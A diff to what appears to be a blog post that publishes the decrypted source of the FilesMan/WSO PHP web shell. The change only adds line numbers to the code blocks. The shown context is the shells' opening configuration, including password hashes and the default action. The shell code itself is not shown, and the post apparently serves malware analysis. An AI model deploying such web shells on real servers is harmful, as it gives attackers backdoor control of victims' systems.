@@ -17,7 +17,7 @@ This is the decrypted version of the [encrypted FilesMan shell][1].
 
 ### FilesMan Shell Source Code (decrypted)
 
-{% highlight php %}<?php #v2.3		//Version
+{% highlight php linenos %}<?php #v2.3		//Version
 $auth_pass = ""; 	//75b43eac8d215582f6bcab4532eb854e 
 $color = "#00FF66";	//Colour
 $default_action = "FilesMan";
@@ -1457,7 +1457,7 @@ exit;
 
 Below is another version of the FilesMan shell &#8211; this one is the WSO Bugabuse.net edition &#8211; Modified by Led-Zeppelin.
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 $auth_pass = "615da5097ad7f4c7c38db0735bfb2004";
 $color = "#df5";
 $default_action = 'FilesMan';
